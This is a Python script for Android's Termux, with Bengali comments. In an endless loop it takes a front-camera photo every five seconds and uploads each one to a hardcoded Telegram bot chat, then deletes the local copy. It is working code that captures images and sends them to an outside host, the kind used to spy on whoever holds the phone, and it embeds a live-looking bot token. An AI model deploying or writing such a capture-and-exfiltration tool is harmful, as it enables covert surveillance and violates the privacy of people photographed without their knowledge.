import os
import time
import requests

# আপনার Telegram Bot Token এবং Chat ID দিন
BOT_TOKEN = "8397043572:AAE8gSE0AtCmtSUQcWqMfOSLDw6F5Lemkw4"
CHAT_ID = "5908310559"

def capture_photo():
    photo_name = "capture.jpg"
    
    # Termux API ব্যবহার করে ফ্রন্ট ক্যামেরা (1) দিয়ে ছবি তোলা
    # ব্যাক ক্যামেরা ব্যবহার করতে চাইলে -c 0 লিখুন
    os.system(f"termux-camera-photo -c 1 {photo_name}")
    
    return photo_name

def send_to_telegram(photo_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    
    try:
        with open(photo_path, 'rb') as photo:
            payload = {'chat_id': CHAT_ID}
            files = {'photo': photo}
            response = requests.post(url, data=payload, files=files)
            
            if response.status_code == 200:
                print("[✔] ছবি সফলভাবে টেলিগ্রাম বটে পাঠানো হয়েছে।")
            else:
                print(f"[✘] টেলিগ্রামে পাঠাতে ব্যর্থ: {response.text}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    print("===  Auto Camera Capture Started ===")
    
    while True:
        print("ছবি তোলা হচ্ছে...")
        file_path = capture_photo()
        
        # ফাইল তৈরি হওয়া পর্যন্ত ১ সেকেন্ড অপেক্ষা
        time.sleep(1)
        
        if os.path.exists(file_path):
            send_to_telegram(file_path)
            # সাময়িক ফাইল মুছে ফেলা
            os.remove(file_path)
        
        print("৫ সেকেন্ড অপেক্ষা করা হচ্ছে...\n")
        time.sleep(5)
          
